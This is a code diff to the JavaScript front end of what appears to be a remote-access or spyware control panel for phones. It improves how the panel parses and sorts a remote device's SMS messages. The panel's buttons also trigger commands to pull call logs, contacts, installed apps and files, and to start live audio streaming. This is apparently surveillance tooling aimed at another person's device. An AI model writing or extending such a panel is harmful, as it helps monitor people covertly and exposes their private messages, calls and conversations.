@@ -2772,27 +2772,54 @@
             let smsArray = [];
             try {
                 if (!data) smsArray = [];
+                else if (typeof data === 'object' && data.error) {
+                    panel.innerHTML = `<h3>💬 SMS Messages</h3><div style="padding:24px; color:var(--danger); background:var(--danger-bg); border-radius:12px; border:1px solid #fbd5d5;">⚠️ Device Error: ${escapeHtml(data.error)}</div>`;
+                    return;
+                }
                 else if (Array.isArray(data)) smsArray = data;
-                else if (typeof data === 'string') smsArray = JSON.parse(data);
-                else if (data.data && Array.isArray(data.data)) smsArray = data.data;
+                else if (typeof data === 'string') {
+                    const parsed = JSON.parse(data);
+                    smsArray = Array.isArray(parsed) ? parsed : (parsed.data || []);
+                }
                 else if (typeof data === 'object') {
-                    for (let k in data) { if (Array.isArray(data[k])) { smsArray = data[k]; break; } }
+                    // Smart discovery: check common keys for arrays
+                    const keys = ['messages', 'sms', 'list', 'data', 'sms_list'];
+                    for (const k of keys) {
+                        if (data[k] && Array.isArray(data[k])) {
+                            smsArray = data[k];
+                            break;
+                        }
+                    }
+                    if (smsArray.length === 0) {
+                        for (let k in data) { if (Array.isArray(data[k])) { smsArray = data[k]; break; } }
+                    }
                 }
             } catch (e) { console.error('SMS parse error:', e); }
 
             if (!Array.isArray(smsArray) || smsArray.length === 0) {
-                panel.innerHTML = '<h3>💬 SMS Messages</h3><p>No messages found or awaiting sync.</p>';
+                panel.innerHTML = '<h3>💬 SMS Messages</h3><p style="padding:20px; text-align:center; opacity:0.7;">No messages found in this box.</p>';
                 return;
             }
             
-            smsArray.sort((a, b) => parseInt(b.date || b.timestamp || 0) - parseInt(a.date || a.timestamp || 0));
+            // Robust sort: handling both number and string dates
+            smsArray.sort((a, b) => {
+                const da = Date.parse(a.date || a.timestamp || a.timeFmt || 0) || (a.date || 0);
+                const db = Date.parse(b.date || b.timestamp || b.timeFmt || 0) || (b.date || 0);
+                return db - da;
+            });
 
-            const rows = smsArray.map(m => [
-                (m.type === 'inbox' || m.type == 1 || m.type === '1') ? '📥 Incoming' : '📤 Outgoing',
-                m.address || m.number || '',
-                m.body || m.text || '',
-                formatAnyDate(m.date || m.timestamp || m.timeFmt)
-            ]);
+            const rows = smsArray.map(m => {
+                const typeStr = String(m.type || '').toLowerCase();
+                // Match "Incoming" string from Java or standard inbox indicators
+                const isIncoming = typeStr.includes('incoming') || typeStr.includes('inbox') || typeStr === '1' || m.type == 1 || typeStr === 'in';
+                
+                return [
+                    isIncoming ? '📥 Incoming' : '📤 Outgoing',
+                    m.address || m.number || m.phone || 'Unknown',
+                    m.body || m.text || m.message || m.content || '',
+                    formatAnyDate(m.date || m.timestamp || m.timeFmt)
+                ];
+            });
             currentSortCol = 3; 
             currentSortDir = 'desc';
             currentData = rows;
@@ -3528,7 +3555,7 @@
             document.getElementById('liveAudioBtn').onclick = startLiveAudio;
             document.getElementById('stopLiveAudioBtn').onclick = stopLiveAudio;
             document.getElementById('fileManagerBtn').onclick = () => { stopActiveModules(); refreshFileRoot(); };
-            document.getElementById('smsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_SMS', { box: 'all' }); };
+            document.getElementById('smsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_SMS', { box: '' }); };
             document.getElementById('callLogsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_CALL_LOGS'); };
             document.getElementById('contactsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_CONTACTS'); };
             document.getElementById('installedAppsBtn').onclick = () => { stopActiveModules(); currentPage = 0; sendCommand('GET_INSTALLED_APPS'); };
